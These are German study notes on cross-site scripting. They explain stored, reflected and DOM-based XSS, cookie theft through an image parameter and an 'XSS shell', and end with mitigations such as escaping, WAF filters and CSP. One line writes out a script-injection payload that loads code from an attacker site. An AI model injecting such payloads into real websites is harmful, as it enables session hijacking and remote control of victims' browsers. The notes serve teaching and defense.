# Cross-Site Scripting (XSS)

## Stored XSS
- Angreifer kann auf Website Code platzieren, dass vom Victim bei Besuch ausgeführt wird
- Mit dem JS wird das Victim dazu gebracht, dem Angreifer die Session zu schicken
    - SOP verhindert das Senden per JS aber
    - Es wird aber z.B. ein Bild eingebunden mit dem Cookie im Parameter
    - Das Cookie landet im Access-Log des Angreifers
- Angreifer braucht Session selber (Session-Hijacking)

## Reflected XSS
- Angreifer schickt GET-Request mit JS in Query-Parameter
- Server sendet 404 mit Fehlermeldung, dass es die Seite nicht gibt, und reflektiert das JS zurück
- Wenn diese Anfrage vom Opfer ausgeführt wird, kann so beliebigs JS zur Ausführung gebracht werden

- Moderne Browser merken das JS in der URL und verhindern das Ausführen beim Reply (XSS-Filter)
- Server kann XSS-Filter auch enforcen (bei neuen Browsern) mit Header `X-XSS-Protection`

## DOM-Based XSS
- XSS im lokalen DOM ohne Server-Request
- JS-code wird im Anchor nach dem `#` angehängt, so wird sie nie dem Server übermittelt

## XSS Shell
- Angreifer injected `<script src="attacker-site/script.js"/>` auf Webapp
- Opfer führt Attacker-JS aus und pollt regelmässig den Attacker-Server
- So kann die Shell Befehle schicken, die vom Opfer abgeholt werden


## Mitigation
- HTML-Characters escapen
    - `<` in `&lt;` usw. umwandeln
    - In Praxis schwierig, das nicht gültige Zeichen wie `'` escaped werden
- Filter in WAF
- [Content Security Policy](8_CSP.md), damit nicht ein fremdes Script mit `<script src="..." />` eingefügt werden kann
